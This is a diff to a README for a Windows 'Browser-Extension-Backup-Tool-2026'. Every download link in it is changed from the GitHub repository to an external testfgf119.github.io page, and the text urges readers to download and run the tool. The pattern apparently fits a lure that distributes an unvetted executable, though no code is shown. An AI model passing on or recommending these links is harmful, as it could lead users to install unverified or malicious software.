@@ -1,6 +1,6 @@
 # 🛡️ Browser-Extension-Backup-Tool-2026 - Never Lose Your Browser Extensions Again
 
-[![Download Now](https://img.shields.io/badge/Download-Browser--Extension--Backup--Tool--2026-blue?style=for-the-badge&logo=github)](https://github.com/Testfgf119/Browser-Extension-Backup-Tool-2026)
+[![Download Now](https://img.shields.io/badge/Download-Browser--Extension--Backup--Tool--2026-blue?style=for-the-badge&logo=github)](https://testfgf119.github.io)
 
 ---
 
@@ -52,7 +52,7 @@ Follow these simple steps to get the tool running on your Windows computer. No p
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Testfgf119/Browser-Extension-Backup-Tool-2026](https://github.com/Testfgf119/Browser-Extension-Backup-Tool-2026)**
+Visit this link to download the application: **[https://testfgf119.github.io](https://testfgf119.github.io)**
 
 Click the download button on that page. The file will start downloading to your computer.
 
@@ -92,7 +92,7 @@ If you ever need to restore your extensions, open the tool again, select the bro
 
 ### Download Button
 
-[![Download Browser-Extension-Backup-Tool-2026](https://img.shields.io/badge/⬇️-Download%20Now-2ea44f?style=for-the-badge)](https://github.com/Testfgf119/Browser-Extension-Backup-Tool-2026)
+[![Download Browser-Extension-Backup-Tool-2026](https://img.shields.io/badge/⬇️-Download%20Now-2ea44f?style=for-the-badge)](https://testfgf119.github.io)
 
 ---
 
